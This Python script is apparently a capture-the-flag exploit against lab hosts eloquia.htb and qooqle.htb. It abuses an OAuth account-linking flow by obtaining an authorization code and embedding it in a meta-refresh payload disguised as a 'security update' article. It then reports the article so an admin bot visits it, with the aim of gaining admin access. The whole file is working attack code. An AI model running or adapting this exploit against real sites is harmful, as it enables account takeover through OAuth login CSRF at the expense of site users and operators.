#!/usr/bin/env python3
"""
Test DIRECT redirect to callback (no external server).
Meta refresh from eloquia.htb article directly to eloquia.htb/callback.
This is same-origin, so cookies SHOULD be preserved.
"""
import requests
import time
import re
import os
import sys
import random
from io import BytesIO

TARGET_ELOQUIA = "http://eloquia.htb"
TARGET_QOOQLE = "http://qooqle.htb"
CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

TMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp")

def get_csrf(html):
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def load_credentials():
    with open(f'{TMP_DIR}/username.txt') as f:
        username = f.read().strip()
    with open(f'{TMP_DIR}/password.txt') as f:
        password = f.read().strip()
    return username, password

def create_banner_image():
    from PIL import Image
    img = Image.new('RGB', (200, 150))
    for i in range(200):
        for j in range(150):
            img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
    buf = BytesIO()
    img.save(buf, 'PNG')
    buf.seek(0)
    return buf

def main():
    username, password = load_credentials()
    print(f"[*] User: {username}")

    # Login to both services
    print(f"[*] Logging into Eloquia...")
    eloquia = requests.Session()
    r = eloquia.get(f'{TARGET_ELOQUIA}/accounts/login/')
    csrf = get_csrf(r.text)
    eloquia.post(f'{TARGET_ELOQUIA}/accounts/login/',
        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f'{TARGET_ELOQUIA}/accounts/login/'})

    print(f"[*] Logging into Qooqle...")
    qooqle = requests.Session()
    r = qooqle.get(f'{TARGET_QOOQLE}/login/')
    csrf = get_csrf(r.text)
    qooqle.post(f'{TARGET_QOOQLE}/login/',
        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f'{TARGET_QOOQLE}/login/'})

    # Get OAuth code
    print(f"[*] Getting OAuth code...")
    auth_url = f'{TARGET_QOOQLE}/oauth2/authorize/?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}'
    r = qooqle.get(auth_url)
    csrf = get_csrf(r.text)
    r = qooqle.post(auth_url,
        data={
            'csrfmiddlewaretoken': csrf,
            'redirect_uri': REDIRECT_URI,
            'scope': 'read write',
            'client_id': CLIENT_ID,
            'response_type': 'code',
            'allow': 'Authorize'
        },
        headers={'Referer': auth_url},
        allow_redirects=False)

    code_match = re.search(r'code=([^&\s]+)', r.headers.get('Location', ''))
    if not code_match:
        print("[-] Failed to get OAuth code")
        sys.exit(1)

    oauth_code = code_match.group(1)
    print(f"[+] OAuth code: {oauth_code}")

    # Create article with DIRECT meta refresh to callback
    timestamp = int(time.time())
    callback_url = f"{REDIRECT_URI}?code={oauth_code}"

    # Meta refresh - same-origin navigation should preserve SameSite=Lax cookies
    content = f'''<meta http-equiv="refresh" content="0;url={callback_url}">
<p>Processing security update...</p>
<p>Please wait...</p>'''

    print(f"\n[*] Creating article with DIRECT callback redirect...")
    print(f"    Target: {callback_url}")

    create_page = eloquia.get(f'{TARGET_ELOQUIA}/article/create/')
    csrf = get_csrf(create_page.text)

    my_articles = eloquia.get(f'{TARGET_ELOQUIA}/article/mine/')
    existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

    r = eloquia.post(f'{TARGET_ELOQUIA}/article/create/',
        data={'csrfmiddlewaretoken': csrf, 'title': f'Direct {timestamp}', 'content': content},
        files={'banner': ('banner.png', create_banner_image(), 'image/png')},
        headers={'Referer': f'{TARGET_ELOQUIA}/article/create/'},
        timeout=60)

    # Find article
    my_articles = eloquia.get(f'{TARGET_ELOQUIA}/article/mine/')
    new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
    created = new_ids - existing_ids
    article_id = max(created) if created else None

    if not article_id:
        print("[-] Failed to create article")
        sys.exit(1)

    print(f"[+] Article created: ID {article_id}")

    # DON'T load the article ourselves - we might trigger the payload!
    print(f"\n[*] NOT checking article content (to avoid triggering payload ourselves)")

    # Report it
    eloquia.get(f'{TARGET_ELOQUIA}/article/report/{article_id}/')
    print(f"[+] Article reported")

    # Wait for bot
    print(f"\n[*] Waiting 90s for bot to visit...")
    for i in range(90):
        print(f"\r    Waiting: {i}s  ", end='', flush=True)
        time.sleep(1)
    print()

    # Check if code was consumed
    print(f"\n[*] Checking if OAuth code was consumed...")
    test_session = requests.Session()
    r = test_session.get(callback_url, allow_redirects=True)

    if 'invalid_grant' in r.text or 'error' in r.text.lower():
        print(f"    [+] Code appears consumed (invalid_grant) - bot used it!")
    elif 'sessionid' in test_session.cookies:
        print(f"    [!] Code still valid - bot did NOT use it")
    else:
        print(f"    [?] Unknown response: {r.text[:200]}")

    # Now try OAuth login
    print(f"\n[*] Attempting OAuth login...")
    eloquia2 = requests.Session()
    r = eloquia2.get(f'{TARGET_ELOQUIA}/accounts/oauth2/qooqle/authorize/', allow_redirects=False)
    qooqle_url = r.headers.get('Location', '')

    r = qooqle.get(qooqle_url)
    csrf = get_csrf(r.text)
    if csrf:
        r = qooqle.post(qooqle_url,
            data={
                'csrfmiddlewaretoken': csrf,
                'redirect_uri': REDIRECT_URI,
                'scope': 'read write',
                'client_id': CLIENT_ID,
                'response_type': 'code',
                'allow': 'Authorize'
            },
            headers={'Referer': qooqle_url},
            allow_redirects=False)
        new_callback = r.headers.get('Location', '')
    else:
        new_callback = r.url if 'code=' in r.url else ''

    r = eloquia2.get(new_callback, allow_redirects=True)

    if 'sessionid' in eloquia2.cookies:
        r = eloquia2.get(f'{TARGET_ELOQUIA}/accounts/profile/')
        match = re.search(r'Howdy,\s*(\w+)', r.text)
        if match:
            logged_as = match.group(1)
            print(f"[*] Logged in as: {logged_as}")
            if 'admin' in logged_as.lower():
                print(f"[+] SUCCESS! Got admin access!")
            else:
                print(f"[-] Not admin - linking didn't work")
        else:
            print(f"[?] Got session but can't determine user")
    else:
        print(f"[-] No session obtained")
        print(f"    Response: {r.text[:300]}")

if __name__ == "__main__":
    main()
